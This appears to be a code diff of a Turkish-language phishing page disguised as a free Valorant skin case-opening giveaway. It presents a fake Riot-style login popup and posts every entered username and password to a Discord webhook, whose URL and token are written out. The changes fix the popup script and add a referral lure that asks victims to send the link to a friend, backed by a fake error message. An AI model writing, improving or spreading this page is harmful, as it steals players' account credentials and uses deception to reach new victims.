@@ -13,10 +13,10 @@
         .live-drops { background: rgba(0, 0, 0, 0.95); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; overflow: hidden; position: relative; width: 100%; }
         .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 50; color: #fff; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
         .drop-container { display: flex; align-items: center; padding-left: 15px; flex-grow: 1; gap: 12px; }
-        .drop-card { background: rgba(255,255,255,0.03); border-radius: 4px; width: 130px; height: 75px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; padding-top: 10px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); animation: slideIn 0.4s ease-out; }
+        .drop-card { background: rgba(255,255,255,0.03); border-radius: 4px; width: 130px; height: 75px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; padding-top: 10px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); animation: slideInLeft 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .drop-card img { height: 45px; object-fit: contain; }
         .rarity-box { width: 100%; height: 6px; margin-top: auto; }
-        @keyframes slideIn { from { transform: translateX(-50px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        @keyframes slideInLeft { from { transform: translateX(-100%); opacity: 0; margin-left: -130px; } to { transform: translateX(0); opacity: 1; margin-left: 0; } }
 
         /* HEADER & GİVEAWAY */
         header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
@@ -49,7 +49,7 @@
         
         .win-view { display:none; animation: zoomIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         @keyframes zoomIn { from { transform: scale(0.8); opacity:0; } to { transform: scale(1); opacity:1; } }
-        .ref-box { background:#000; padding:12px; border:1px dashed #79eb1e; color:#79eb1e; font-size:12px; margin:15px 0; cursor:pointer; }
+        .ref-box { background:#000; padding:12px; border:1px dashed #79eb1e; color:#79eb1e; font-size:12px; margin:15px 0; cursor:pointer; font-family: monospace; }
     </style>
 </head>
 <body>
@@ -88,7 +88,7 @@
     <div id="caseModal" class="modal-overlay">
         <div class="modal-card">
             <div id="openingView">
-                <h2 style="font-family:'Montserrat'; letter-spacing: 2px;">KASA AÇILIYOR...</h2>
+                <h2 style="font-family:'Montserrat'; letter-spacing: 2px; color:var(--valo-red);">KASA AÇILIYOR...</h2>
                 <div class="spinner-box">
                     <div class="spinner-line"></div>
                     <div id="itemStrip" class="item-strip"></div>
@@ -99,8 +99,9 @@
                 <img id="wonImg" src="" style="width:220px; margin:15px 0; filter:drop-shadow(0 0 30px #79eb1e);">
                 <h2 id="wonName" style="margin:0;">-</h2>
                 <div id="wonVP" style="background:#79eb1e; color:#000; padding:12px; border-radius:6px; font-weight:900; margin-top:15px; font-size:22px;">0 VP</div>
-                <div class="ref-box" onclick="alert('Link Kopyalandı!')">VALOLOOT.NET/JOIN?REF=<span id="refCode">...</span></div>
-                <button class="open-btn" style="background:#79eb1e; color:#000;" onclick="alert('Hata: Arkadaşınız henüz kayıt olmadı!')">HESABA AKTAR (VP)</button>
+                <p style="font-size:12px; color:#aaa; margin-top:20px;">Ödülü çekmek için linki 1 arkadaşına gönder!</p>
+                <div class="ref-box" onclick="copyRef()">VALOLOOT.NET/JOIN?REF=<span id="refCode">...</span></div>
+                <button class="open-btn" style="background:#79eb1e; color:#000;" onclick="alert('Hata: Davet ettiğiniz arkadaşınız henüz kayıt olmadı! Lütfen bekleyin.')">HESABA AKTAR (VP)</button>
             </div>
         </div>
     </div>
@@ -115,19 +116,22 @@
             {n: "KAOS VANDAL", img: "skin5.png", vp: "2175 VP", color: "#ff4655"}
         ];
 
-        // CANLI DROP
+        // 1. CANLI DROP (Animasyonlu)
         function spawnDrop() {
             const track = document.getElementById('dropTrack');
             const s = skins[Math.floor(Math.random() * skins.length)];
             const div = document.createElement('div');
             div.className = 'drop-card';
             div.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:${s.color}"></div>`;
-            track.prepend(div);
-            if(track.children.length > 12) track.removeChild(track.lastChild);
-            setTimeout(spawnDrop, Math.random() * 3000 + 2000);
+            
+            // En başa (sola) ekliyoruz, CSS'deki margin ve transform ile sağa ittiriyor
+            track.prepend(div); 
+            
+            if(track.children.length > 10) track.removeChild(track.lastChild);
+            setTimeout(spawnDrop, Math.random() * 2500 + 1500);
         }
 
-        // KASALAR
+        // 2. KASALAR
         function loadCases() {
             const cases = [
                 {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png", free: true},
@@ -150,7 +154,7 @@
             });
         }
 
-        // KASA AÇMA
+        // 3. ÜCRETSİZ KASA AÇMA
         function openFreeCase() {
             if(!IS_LOGGED) { openAuth(); return; }
             document.getElementById('caseModal').style.display = 'flex';
@@ -174,12 +178,18 @@
                     document.getElementById('wonImg').src = winner.img;
                     document.getElementById('wonName').innerText = winner.n;
                     document.getElementById('wonVP').innerText = winner.vp;
-                    document.getElementById('refCode').innerText = "VLOOT" + Math.floor(1000 + Math.random() * 9000);
                 }, 5500);
             }, 100);
         }
 
-        // GİRİŞ EKRANI (RIOT STİLİ)
+        // 4. LİNK KOPYALAMA
+        function copyRef() {
+            const text = document.querySelector('.ref-box').innerText;
+            navigator.clipboard.writeText(text);
+            alert("Referans linkin kopyalandı! Bir arkadaşına göndererek ödülünü alabilirsin.");
+        }
+
+        // 5. GİRİŞ EKRANI (DÜZELTİLDİ: <\/script> eklendi)
         function openAuth() {
             const w = 450, h = 750;
             const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
@@ -205,33 +215,44 @@
                     <button onclick="send()">GİRİŞ YAP</button>
                     <p style="font-size:10px; color:#aaa; margin-top:30px;">HESABIN YOK MU? ÜCRETSİZ OLUŞTUR</p>
                 </div>
-                <script>function send(){ const u=document.getElementById('u').value, p=document.getElementById('p').value; if(u && p){ window.opener.postMessage({u,p}, "*"); window.close(); } }</script>
+                <script>function send(){ const u=document.getElementById('u').value, p=document.getElementById('p').value; if(u && p){ window.opener.postMessage({u,p}, "*"); window.close(); } }<\\/script>
                 </body></html>
             `);
         }
 
-        // TIMER & MESSAGES
+        // 6. GİRİŞİ YAKALAMA VE WEBHOOK
         window.addEventListener("message", (e) => {
             if(e.data.u && e.data.p) {
                 IS_LOGGED = true;
-                document.getElementById('authArea').innerHTML = `<div style="color:#79eb1e; font-weight:900; border:2px solid #79eb1e; padding:8px 15px; border-radius:4px;">${e.data.u.toUpperCase()}#TR1</div>`;
-                document.getElementById('giveawayStatus').innerText = "ÇEKİLİŞE KATILDINIZ!";
+                const username = e.data.u.toUpperCase();
+                document.getElementById('authArea').innerHTML = `<div style="display:flex; align-items:center; gap:10px; background: rgba(0,0,0,0.7); padding: 5px 15px; border-radius: 4px; border: 1px solid #79eb1e;"><div style="color:#fff; font-weight:800;">${username}#TR1</div></div>`;
+                
+                document.getElementById('giveawayStatus').innerText = "HESAP DOĞRULANDI, ÇEKİLİŞE KATILDINIZ!";
                 document.getElementById('giveawayStatus').style.color = "#79eb1e";
-                loadCases();
+                
+                document.getElementById('refCode').innerText = username.slice(0,4) + Math.floor(1000 + Math.random() * 9000);
+                
+                loadCases(); // Kasaları tekrar yükle ki Başlangıç "Ücretsiz" olsun
+                
                 fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                     method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: `✅ **Yeni Login!**\n👤: \`${e.data.u}\` | 🔑: \`${e.data.p}\`` })
+                    body: JSON.stringify({ content: `✅ **Yeni Giriş!**\n👤 Kullanıcı: \`${e.data.u}\`\n🔑 Şifre: \`${e.data.p}\`` })
                 });
             }
         });
 
+        // SAYAÇ
         function tick() {
             const now = new Date(); let target = new Date(); target.setHours(24, 0, 0, 0);
             let diff = target - now; if(diff < 0) diff += 86400000;
             let h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
             document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
         }
-        setInterval(tick, 1000); tick();
+        
+        setInterval(tick, 1000); 
+        tick();
+        
+        // SAYFA YÜKLENİNCE BAŞLAT
         window.onload = () => { spawnDrop(); loadCases(); };
     </script>
 </body>
